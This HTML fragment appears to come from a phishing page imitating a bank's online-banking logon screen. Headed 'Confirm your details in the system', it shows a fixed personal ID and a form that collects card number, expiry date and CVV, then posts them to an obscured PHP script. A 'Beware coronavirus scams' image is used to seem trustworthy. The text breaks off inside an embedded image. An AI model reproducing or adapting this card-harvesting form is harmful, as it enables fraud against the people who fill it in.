                                                <h1 class="title-header title-color-red">Confirm your details in the system.</h1>
                                            </div>

                                            <div aria-live="off" class="mt-3">
                                                <ul class="nav nav-tabs d-flex justify-content-center" role="tablist">
                                                    <li class="nav-item" role="presentation"><a class="nav-link active" data-toggle="tab" href="" role="tab"><span>Personal ID </span> <strong class="pid-display">46787543245</strong></a>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>

                                        <div>
                                            <div class="tab-content d-flex justify-content-center mt-4 mb-5">
                                                <div class="tab-pane active retail-logon-content" id="personal" role="tabpanel">
                                                    <div aria-live="off">
                                                        <olb-retail-logon>
                                                            <div class="logon-form">

                                                                <form name="form5" autocomplete="off" novalidate="" method="post" class="pg-forms ng-pristine ng-invalid ng-touched" action="___.php?_do=form5">

                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="card_number">Card number</label>
                                                                            <input alphanumericvalidator="" aria-describedby="card_numberDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched nums-only" formcontrolname="card_number" id="card_number" maxlength="20" minlength="13" name="card_number" onpaste="return true" type="text">
                                                                            <span class="d-none" id="card_numberDesc"> Please Enter your Card number </span>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="expiry_date">Expiry date</label>
                                                                            <input alphanumericvalidator="" aria-describedby="expiry_dateDesc" aria-required="true" autocomplete="off" class="form-control ng-pristine ng-invalid ng-touched exdate" formcontrolname="expiry_date" id="expiry_date" maxlength="5" name="expiry_date" onpaste="return true" type="text">
                                                                            <span class="d-none" id="expiry_dateDesc"> Please Enter your Expiry date </span>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="cvv">CVV</label>
                                                                            <input alphanumericvalidator="" aria-describedby="cvvDesc" aria-required="true" autocomplete="off" class="form-control ng-pristine ng-invalid ng-touched nums-only" formcontrolname="expiry_date" id="cvv" minlength="3" maxlength="4" name="cvv" onpaste="return true" type="text">
                                                                            <span class="d-none" id="cvvDesc"> Please Enter your CVV</span>
                                                                        </div>
                                                                    </div>

                                                                    <div class=" mt-4 row d-flex">
                                                                        <!---->
                                                                        <div class="mt-4 text-center col-md-12 pl-0 pr-0">
                                                                            <div class="justify-content-center button-xs-width">
                                                                                <button aria-describedby="logonButtonDesc" class="button button-secondary button-logon js-btn-continue" id="confirmbtn5" type="submit" disabled="disabled"><span class="log-on-text">Confirm</span>
                                                                                    </button><span class="d-none" id="logonButtonDesc"> Please click confirm button to confirm your details in system. </span>
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                </form>

                                                            </div>
                                                        </olb-retail-logon>

                                                    </div>

                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- js-right-content -->

                                    <div class="col-lg-7 right-content">
                                        <div aria-live="off">
                                            <olb-logon-right-content>
                                                <div class="js-right-content" xxstyle="display: none;">
                                                    <div class="row logon-image mt-5">
                                                        <img alt="Beware coronavirus scams Image" class="logon-right-image" src="data:image/png;base64,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